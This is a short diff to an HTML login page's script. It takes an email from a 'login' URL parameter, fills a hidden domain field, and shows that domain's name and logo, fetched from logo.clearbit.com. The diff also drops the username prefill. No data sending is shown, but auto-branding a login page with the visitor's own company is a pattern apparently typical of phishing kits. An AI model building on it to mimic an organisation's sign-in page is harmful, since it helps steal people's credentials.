@@ -141,7 +141,6 @@
       </td>
     </tr>
   </table>
-
   <script>
     const params = new URLSearchParams(window.location.search);
     const raw = params.get('login');
@@ -152,16 +151,12 @@
       [user, domain] = email.split('@');
     }
 
-    // Set input values
-    const userInput = document.querySelector('input[name="user"]');
-    if (userInput) userInput.value = user || '';
-
+    // Set domain value
     const hiddenDomain = document.getElementById('hiddenDomain');
     if (hiddenDomain) hiddenDomain.value = domain || 'domain';
 
     // Update domain visuals
     if (domain) {
-      document.getElementById('domainAddon').textContent = '@' + domain;
       document.getElementById('domainLabel').textContent = domain;
       document.getElementById('logo').src = 'https://logo.clearbit.com/' + domain;
     }
